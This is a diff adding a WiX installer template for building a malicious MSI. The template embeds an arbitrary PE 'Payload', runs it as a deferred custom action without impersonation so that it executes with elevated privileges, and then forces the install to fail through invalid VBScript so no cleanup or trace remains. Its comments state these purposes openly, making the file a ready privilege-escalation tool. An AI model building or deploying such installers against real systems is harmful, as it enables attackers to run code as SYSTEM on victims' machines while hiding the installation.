@@ -1,0 +1,35 @@
+<?xml version='1.0' encoding='windows-1252'?>
+<Wix xmlns='http://schemas.microsoft.com/wix/2006/wi'>
+  <Product Name='Foobar 1.0' Id='*' 
+    Language='1033' Codepage='1252' Version='1.0.0' Manufacturer='Acme Ltd.'>
+
+	<Package InstallerVersion="100" Languages="0" Manufacturer="Acme Ltd." ReadOnly="no" />	
+	
+	<Media Id='1' />
+
+	<Directory Id='TARGETDIR' Name='SourceDir'>
+	   <Component Id='MyComponent' Guid='12345678-1234-1234-1234-123456789012'>
+		  <Condition>0</Condition>
+	   </Component>		
+	</Directory>
+	
+	<!-- Ensure buffer file is large enough to handle the PE you are inserting -->
+	<Binary Id='Payload' SourceFile='buffer' />
+	
+	<!-- Execute must be deferred and Impersonate no to run as a higher privilege level -->
+	<CustomAction Id='ExecPayload' BinaryKey='Payload' Impersonate='no' Execute='deferred' ExeCommand='' Return='asyncNoWait'/>
+	<!-- Attempt to launch some invalid VBS to fail the installation so no cleanup is required -->
+	<CustomAction Id='FailInstallation' Impersonate='no' Execute='deferred' Script='vbscript' Return='check'>fail</CustomAction>
+
+    <Feature Id='Complete' Level='1'>
+		<ComponentRef Id='MyComponent' />
+    </Feature>
+	
+	<InstallExecuteSequence>
+		<ResolveSource After="CostInitialize" />
+		<Custom Action="ExecPayload" After="InstallInitialize" />
+		<Custom Action="FailInstallation" Before="InstallFiles" />
+	</InstallExecuteSequence>
+
+  </Product>
+</Wix>
